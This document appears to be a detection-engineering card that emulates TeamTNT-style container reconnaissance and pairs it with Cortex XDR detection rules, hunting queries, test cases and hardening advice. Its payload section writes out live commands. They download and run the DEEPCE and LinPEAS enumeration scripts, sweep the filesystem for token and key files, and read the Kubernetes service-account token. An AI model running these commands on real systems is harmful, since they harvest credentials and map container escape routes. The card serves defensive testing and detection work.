identity.name: Container Enumeration via DEEPCE and LinPEAS (T1613)
identity.summary: A compromised container account runs container-aware enumeration tooling (DEEPCE, LinPEAS) plus hand-rolled discovery — reading /proc/1/status capability masks, listing /dev for block devices, inspecting overlay/docker mounts, and harvesting the mounted Kubernetes service-account token. Cortex Cloud runtime defense and XDR container BIOCs flag the known-tool signatures and the device/capability…
identity.description: Container-aware enumeration is the first move TeamTNT performed after dropping the Hildegard toolkit into exposed Kubernetes workloads: before escalating they fingerprint the runtime to learn whether the container is privileged, what capabilities are granted, which host paths are mounted, and whether a service-account token is readable. This scenario reproduces that recon from a non-root container-runtime identity using the public DEEPCE container-enumeration script, LinPEAS, and direct reads of /proc/1/status, /dev, the overlay mount table, and /var/run/secrets/kubernetes.io/serviceaccount/token. The detection approach is container-context behavioral analysis: Cortex matches the verbatim DEEPCE/LinPEAS invocation signatures, the curl-pipe-bash download pattern inside a container, the capability-mask read coupled with device enumeration, the broad find-for-token filesystem sweep, and the service-account token access. A correlation rule fuses these recon stages from one container_id into a single Discovery incident, demonstrating XSIAM stitching across container runtime telemetry.

techniques.name: Command and Scripting Interpreter: Unix Shell

execution.framework_reference_id: T1613 — Container discovery via DEEPCE / LinPEAS enumeration scripts inside a running container.

prerequisites.description: Cortex Cloud runtime defender (or Cortex XDR Linux agent) installed and reporting on the container host/node.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i defender

prerequisites.description: Lab environment matching scenario SIM-CDR-001 — a running container with curl/wget available and a mounted Kubernetes service-account token.

payload.code:
# Container-aware enumeration — read-only recon, no destructive actions.
curl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt
ls -la /dev/ | head -30 && cat /proc/1/status | grep -E 'CapEff|CapPrm' && mount | grep -E 'overlay|docker|k8s'
find / -name 'token' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -20
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50
curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | grep -E 'CVE|docker|container|cgroup|escape'

expected_artifacts.description: DEEPCE enumeration script executed by bash inside a container.
curl downloading an enumeration script piped into bash within a container.
Read of /proc/1/status capability mask from a container process.
Read of the mounted Kubernetes service-account token.

iocs.context: DEEPCE container-enumeration script — staged in /tmp and executed inside the container.
LinPEAS privilege-escalation enumeration script downloaded into the container.

biocs.name: CDR-001 Package Manager Execution Inside Running Container
biocs.description: Package manager execution inside running container — unusual install pattern indicates post-exploitation activity. apt-get/apk/yum runs interactively in a container where image content should already be baked.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("apt-get", "apt", "apk", "yum", "dnf")
| filter action_process_image_command_line contains_any ("install", "add", "update")

biocs.name: CDR-001 DEEPCE Container Enumeration Script Execution
biocs.description: DEEPCE container enumeration script execution — known tool signature matched by CDR BIOC rule. bash runs deepce.sh inside a container to fingerprint the runtime for escape vectors.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("bash", "sh")
| filter action_process_image_command_line contains "deepce"

biocs.name: CDR-001 Curl Pipe Bash Download Execute In Container
biocs.description: Suspicious curl download followed by bash execution in container context (curl-pipe-bash pattern). A container process curls a remote script and immediately executes it through a shell.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("curl", "wget")
| filter action_process_image_command_line contains_any (".sh", "raw/main", "releases/latest")
| filter causality_actor_process_image_name in ("bash", "sh")

biocs.name: CDR-001 Container Capability Mask Read From Proc1 Status
biocs.description: Container privileged mode enumeration — /proc/1/status capability read indicating escape preparation. A container process reads the init process capability mask to determine whether it runs privileged.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter container_id != null
| filter action_file_path in ("/proc/1/status", "/proc/self/status")
| filter actor_process_image_name in ("cat", "grep", "bash", "sh", "deepce.sh")

biocs.name: CDR-001 Container Device Enumeration With Capability Inspection
biocs.description: Suspicious device enumeration and capability inspection sequence in container. A container process lists /dev block devices alongside reading capability/mount state to map escape preconditions.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("ls", "mount", "env")
| filter action_process_image_command_line contains_any ("/dev/", "overlay", "docker", "k8s", "kube")

biocs.name: CDR-001 Service Account Token Access From Container
biocs.description: Service account token access from within container — credential harvesting behavior. A container process reads the projected Kubernetes service-account token from the secrets mount.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter container_id != null
| filter action_file_path contains "serviceaccount/token"
| filter actor_process_image_name in ("cat", "find", "bash", "sh", "cp")

biocs.name: CDR-001 Broad Filesystem Credential Search In Container
biocs.description: Broad filesystem credential search pattern (find / -name token) in container context. find sweeps the whole container filesystem for token/key/pem files.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "find"
| filter action_process_image_command_line contains_any ("-name token", ".pem", ".key")

biocs.name: CDR-001 LinPEAS Privilege Escalation Tool In Container
biocs.description: LinPEAS execution in container — post-exploitation privilege escalation tool signature. bash runs linpeas.sh inside a container to enumerate privilege-escalation and escape vectors.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("bash", "sh", "linpeas.sh")
| filter action_process_image_command_line contains "linpeas"

biocs.name: CDR-001 Automated Discovery Command Burst In Container
biocs.description: Multiple system enumeration commands executed in sequence — automated discovery behavior. A burst of distinct discovery binaries fires from one container lineage in a short window.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("uname", "id", "hostname", "ls", "cat", "mount", "env", "find")
| comp count_distinct(actor_process_image_name) as discovery_breadth by container_id, causality_actor_process_instance_id
| filter discovery_breadth >= 4

xql_queries.name: CDR-001 Validate DEEPCE Or LinPEAS Execution In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter action_process_image_command_line contains_any ("deepce", "linpeas")
| fields _time, agent_hostname, container_id, actor_process_image_name, actor_effective_username, action_process_image_command_line

xql_queries.name: CDR-001 Validate Service Account Token Read In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.FILE
| filter container_id != null
| filter action_file_path contains "serviceaccount/token"
| fields _time, agent_hostname, container_id, actor_process_image_name, action_file_path

xql_queries.name: CDR-001 Validate Capability And Device Recon In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter action_process_image_command_line contains_any ("/proc/1/status", "/proc/self/status", "CapEff", "/dev/")
| fields _time, agent_hostname, container_id, actor_process_image_name, action_process_image_command_line

correlation_rules.name: Container Discovery Recon Chain — Same Container
correlation_rules.logic: BIOC(CDR-001 DEEPCE Container Enumeration Script Execution) OR BIOC(CDR-001 Curl Pipe Bash Download Execute In Container) OR BIOC(CDR-001 Container Capability Mask Read From Proc1 Status) OR BIOC(CDR-001 Container Device Enumeration With Capability Inspection) OR BIOC(CDR-001 Service Account Token Access From Container) OR BIOC(CDR-001 Broad Filesystem Credential Search In Container) OR BIOC(CDR-001 LinPEAS Privilege Escalation Tool In Container) OR BIOC(CDR-001 Automated Discovery Command Burst In Container)

analytics_modules: Cortex Cloud Runtime Defense — Container reconnaissance / enumeration tooling
Cortex XDR Analytics — Container process performing host capability and credential discovery

products.evidence_query: preset = xdr_data | filter container_id != null | filter action_process_image_command_line contains_any ("deepce", "linpeas") | fields _time, container_id, action_process_image_command_line
preset = xdr_data | filter action_file_path contains "serviceaccount/token" | fields _time, container_id, actor_process_image_name, action_file_path
Correlation CR-CDR-0001 fuses DEEPCE/LinPEAS, capability/device recon, and service-account token access from one container into a single Discovery incident.

use_cases.name: Container Runtime Threat Detection — Enumeration Stage
use_cases.description: Detect container-aware reconnaissance (DEEPCE/LinPEAS, capability + device inspection, service-account token harvest) and stitch the recon stages into one incident.

test_cases.objective: Each enumeration stage fires its corresponding Cortex container BIOC.
preconditions: Cortex Cloud runtime defender or Cortex XDR Linux agent >= 8.4.0 reporting on the node.
BIOCs from this card imported and enabled.
steps: Run SIM-CDR-001 steps 1-5 inside the lab container.
Observe BIOC alerts per stage in the Cortex console.
success_criteria: BIOC `CDR-001 DEEPCE Container Enumeration Script Execution` fires within 60s.
BIOC `CDR-001 Service Account Token Access From Container` fires when the token is read.
All three XQL validation queries return >= 1 row.

test_cases.objective: Recon stages stitch into a single container-discovery incident.
success_criteria: Correlation `CR-CDR-0001` groups the recon stages from one container_id into one incident.
Incident severity is Medium or higher.

preventive_controls: Run containers as non-root with a read-only root filesystem and dropped Linux capabilities.
Disable automatic service-account token mounting (automountServiceAccountToken: false) for workloads that do not call the API.
Enforce a runtime allowlist of process binaries per image so enumeration tools never appear.
Restrict container egress so curl/wget cannot pull tooling from GitHub.
detection_engineering: Alert on any container process executing deepce/linpeas or reading /proc/1/status capability masks.
Alert on service-account token reads by processes other than the application binary.
Hunt for curl-pipe-bash and a burst of distinct discovery binaries from one container lineage.

references.title: Unit42 - Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes
MITRE ATT&CK T1613 — Container and Resource Discovery
